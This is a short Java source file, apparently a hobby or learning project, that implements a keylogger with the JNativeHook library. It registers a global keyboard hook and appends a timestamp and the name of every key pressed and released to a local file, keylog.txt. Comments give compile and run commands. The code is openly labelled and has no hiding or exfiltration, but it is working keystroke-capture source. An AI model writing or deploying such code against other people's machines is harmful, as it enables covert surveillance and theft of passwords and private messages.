// to complile: javac -cp C:\Users\Alpha\Desktop\Keylogger\Keylogger\lib\jnativehook-2.2.2.jar Keylogger.java
// to run(not working): java -cp C:\Users\Alpha\Desktop\Keylogger\Keylogger\lib\jnativehook-2.2.2.jar. Keylogger
package khushi;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

import java.io.FileWriter;
import java.io.IOException;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener
{
    private FileWriter output;

    public Keylogger()
    {
        try
        {
            output = new FileWriter("keylog.txt", true); // true means the file is appended
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public static void main(String[] args)
    {
        System.out.println("Hello World!");
        try
        {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e)
        {
        }
        GlobalScreen.addNativeKeyListener(new Keylogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent arg0)
    {
        String dateTime = getCurrentDateTime();
        String keyText = dateTime + " - Pressed this key: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()) + "\n";
        System.out.println(keyText);
        try
        {
            output.write(keyText);
            output.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0)
    {
        String dateTime = getCurrentDateTime();
        String keyText = dateTime + " - Released this key: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()) + "\n";
        System.out.println(keyText);
        try
        {
            output.write(keyText);
            output.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    private String getCurrentDateTime()
    {
        LocalDateTime now = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        return now.format(formatter);
    }

}
